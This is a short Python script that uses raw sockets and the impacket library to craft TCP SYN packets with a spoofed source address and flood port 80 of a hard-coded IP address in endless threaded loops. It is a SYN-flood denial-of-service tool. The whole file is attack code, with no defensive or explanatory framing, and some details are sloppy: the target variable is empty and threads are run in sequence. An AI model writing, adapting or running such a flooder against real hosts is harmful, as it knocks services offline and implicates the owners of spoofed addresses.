import socket
import threading

import impacket.ImpactPacket


def attack(dst):
    while True:
        so = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

        ip = impacket.ImpactPacket.IP()
        tcp = impacket.ImpactPacket.TCP()

        ip.set_ip_src("123.45.3.87")
        ip.set_ip_dst("47.106.220.7")
        ip.set_ip_ttl(225)

        tcp.set_th_flags(0b00000010)
        tcp.set_th_sport(25565)
        tcp.set_th_dport(80)
        tcp.set_th_ack(0)
        tcp.set_th_seq(22903)
        tcp.set_th_win(20000)

        ip.contains(tcp)
        ip.calculate_checksum()
        for i in range(6400):
            so.sendto(ip.get_packet(), (dst, 80))
        so.close()


if __name__ == '__main__':
    floodIp = ""
    while True:
        threading.Thread(target=attack, args=floodIp).run()
